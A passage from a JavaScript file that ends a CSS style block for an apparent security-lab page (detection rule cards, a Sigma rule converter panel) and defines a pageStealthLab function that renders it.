            .rule-source { padding: 3px 10px; background: rgba(59,130,246,0.2); color: #60a5fa; border-radius: 12px; font-size: 0.75rem; }
            .rule-card h4 { margin: 0 0 15px; color: #fff; }
            .rule-condition { background: #0a0a12; padding: 12px; border-radius: 8px; margin-bottom: 15px; }
            .rule-condition label { display: block; color: #888; margin-bottom: 5px; font-size: 0.8rem; }
            .rule-condition code { color: #f59e0b; font-size: 0.85rem; }
            .rule-card button { width: 100%; padding: 10px; background: rgba(139,92,246,0.2); border: 1px solid rgba(139,92,246,0.3); border-radius: 8px; color: #a78bfa; cursor: pointer; }

            .sigma-converter { background: rgba(0,0,0,0.3); padding: 25px; border-radius: 12px; }
            .sigma-converter h4 { color: #60a5fa; margin: 0 0 10px; }
            .sigma-converter p { color: #888; margin: 0 0 15px; }
            .sigma-converter textarea { width: 100%; height: 150px; padding: 15px; background: #0a0a12; border: 1px solid #333; border-radius: 8px; color: #fff; font-family: monospace; resize: vertical; }
            .sigma-converter button { margin-top: 10px; padding: 12px 25px; background: #60a5fa; border: none; border-radius: 8px; color: #fff; cursor: pointer; }
            .sigma-analysis { margin-top: 20px; padding: 20px; background: #0a0a12; border-radius: 8px; }

            @media (max-width: 900px) {
                .sim-split { grid-template-columns: 1fr; }
                .attacks-grid { grid-template-columns: 1fr; }
            }
        </style>`;
    }
};

function pageStealthLab() {
    return StealthLab.render();
}
